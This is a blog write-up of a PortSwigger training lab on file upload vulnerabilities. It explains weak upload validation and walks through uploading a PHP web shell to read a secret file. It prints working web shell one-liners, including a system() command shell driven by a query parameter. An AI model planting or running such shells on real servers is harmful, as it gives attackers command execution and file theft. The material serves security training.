---
title: PortSwigger SSVs - File upload vulnerabilities
date: 2023-12-20
categories: [Training, PortSwigger]
tags: [portswigger, server-side-vulnerabilities, file-upload-vulnerabilities]
img_path: /assets/portswigger/server-side/file_upload
published: true
---

## What are file upload vulnerabilities?

**File upload vulnerabilities** are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. As a result, the user can upload arbitrary and potentially dangerous files.

Developers implement what they believe to be robust validation that is either inherently flawed or can be easily bypassed. For example, they may attempt to **blacking dangerous file types**, but fail to account for parsing discrepancies when checking the file extensions, or miss more obscure file types altogether. In other cases, the website may attempt to **check the file type by verifying properties that can be easily manipulated** by an attacker. Ultimately, even **robust validation measures may be applied inconsistenly** across the network of hosts and directories that form the website, resulting in discrepancies that can be exploited.

## Exploiting unrestricted file uploads to deploy a web shell

For a security perspective, the worst possible scenario is when a website allows you to upload server-side script, such as PHP, Java, Python, etc., and is also configured to execute them as code.

> _A **web shell** is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint._

If we are able to upload a web shell, we effectively have full control over the server. For example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:

```PHP
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Once uploaded, sending a request for this malicious file will return the target file's contents in response. 

A more versatile web shell may look like this:

```php
<?php echo system($_GET['command']); ?>
```

This script enables us to pass an arbitrary system command via a query parameter as follows: `GET /example/exploit.php?command=id HTTP/1.1`.

### Lab: Remote code execution via web shell upload

**Objective**:  _This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem. To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner. You can log in to your own account using the following credentials: `wiener:peter`._

1. Upon logging in, we can see an upload functionality:

    ![](lab1_upload.png)

2. We notice that this functionality is intended for uploading images, so let's enable Image capturing on Burp:

    ![](lab1_filters.png)

3. We will upload a normal picture and examine how the upload process works:

    ![](lab1_pic_upload.png)

    ![](lab1_pic_uploaded.png)

    ![](lab1_files_dir.png)

4. We can see that there is a GET request associated with the uploaded image which saves it under `/files/avatars/`. We can use this URL to access the image directly:

    ![](lab1_image.png)

5. Now we know how the upload files can be accessed, we can upload a webshell, get the contents of the required file, and submit our solution:

    ```shell
    $ sudo chmod +x webshell.php

    $ cat webshell.php
    <?php echo file_get_contents('/home/carlos/secret'); ?>

    $ ls -l webshell.php
    -rwxr-xr-x 1 root root 56 Dec 20 14:49 webshell.php
    ```

    ![](lab1_webshell_upload.png)

    ![](lab1_content.png)

    ![](lab1_solved.png)

## Resources

- [Server-side vulnerabilities](https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice).
- Relate practice: [DVWA File Upload](https://cspanias.github.io/posts/DVWA-File-Upload/).